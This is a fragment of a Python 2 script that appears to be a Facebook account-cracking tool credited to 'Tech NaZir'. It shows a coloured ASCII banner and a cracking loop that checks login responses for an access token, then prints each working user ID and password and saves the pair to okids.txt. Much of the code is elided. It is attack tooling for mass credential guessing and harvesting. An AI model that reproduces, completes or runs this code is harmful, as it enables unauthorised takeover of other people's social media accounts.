...
\033[0;92md s  b d s.   sSSSSSs d d ss.  
S  S S S  ~O       s  S S    b
S   SS S   `b     s   S S    P
S    S S sSSO    s    S S sS'
S    S S    O   s     S S   S
P    P P    P sSSSSSs P P    P
                                                                   
\n\033[0m----------------------------------
\033[1;92mAuthor \033[1;93m: Tech NaZir
\033[1;92mFb \033[1;93m: NaZir KHaN
...
def crack_select():
    ...
    def main(arg):
        ...
        try:
            ...
            q = json.loads(data)
            if 'access_token' in q:
                print '\x1b[1;32m[NAZIR-OK]\033[0m ' + uid + ' | ' + pass1 + '\x1b[0;97m'
                ok = open('okids.txt', 'a')
                ok.write(uid + '|' + pass1 + '\n')
                ok.close()
